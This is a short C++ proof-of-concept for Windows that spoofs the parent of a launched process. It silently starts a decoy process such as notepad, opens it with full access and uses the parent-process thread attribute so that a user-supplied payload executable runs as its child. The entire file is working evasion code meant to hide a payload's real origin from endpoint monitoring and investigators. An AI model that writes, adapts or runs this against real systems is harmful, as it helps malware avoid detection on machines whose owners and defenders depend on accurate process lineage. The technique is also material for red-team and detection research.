#include <Windows.h>
#include <iostream>

using namespace std;

INT main( INT argc, PCHAR argv[]) 
{
	SIZE_T AttribListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = { 0 };
	HANDLE hNewParent = NULL;
	BOOL Ret = FALSE;
	STARTUPINFOA StartIn = { 0 };
	PROCESS_INFORMATION ProcInfo = { 0 };
	DWORD TargetPid = 0;
	STARTUPINFOEX StartupNewProc = { 0 };
	PROCESS_INFORMATION ProcInfoNewProc = { 0 };


	StartIn.dwFlags = STARTF_USESHOWWINDOW;

	if (argc != 3) 
	{
		cout << "PoC to spoof the parent process of an executable" << endl;
		cout << "[+] Usage: Enter path to the spoofed parent process followed by path to the payload" << endl << endl;
		cout << "ParentSpoof.exe c:\\Windows\\System32\\notepad.exe c:\\path_to_payload\\payload.exe" << endl;
		return 1;
	}

			
	Ret = CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &StartIn, &ProcInfo);

	if (!Ret)
	{
		cout << "Error creating Target Process: " << GetLastError() << endl;
	}

	TargetPid = ProcInfo.dwProcessId;
		
	hNewParent = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPid);
	if (hNewParent == NULL)
	{
		cout << "Error Opening the process: " << GetLastError() << endl;
	}


	InitializeProcThreadAttributeList(NULL, 1, 0, &AttribListSize);

	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, AttribListSize);

	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &AttribListSize))
	{
		HeapFree(GetProcessHeap(), 0, pAttributeList);
		return 1;
	}

	if (!pAttributeList)
	{
		cout << "Memory allocation error: " << GetLastError();
	}

	Ret = UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hNewParent, sizeof(HANDLE), NULL, NULL);

	if (!Ret)
	{
		cout << "Error updating Process Thread Attribute: " << GetLastError();
	}

	StartupNewProc.StartupInfo.cb = sizeof(STARTUPINFOEX);
	StartupNewProc.lpAttributeList = pAttributeList;

	Ret = CreateProcessA(NULL, argv[2], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&StartupNewProc.StartupInfo, &ProcInfoNewProc);
	
	if (!Ret)
	{
		cout << "Payload process creation error: " << GetLastError() << endl;
	}

	return 0;

}

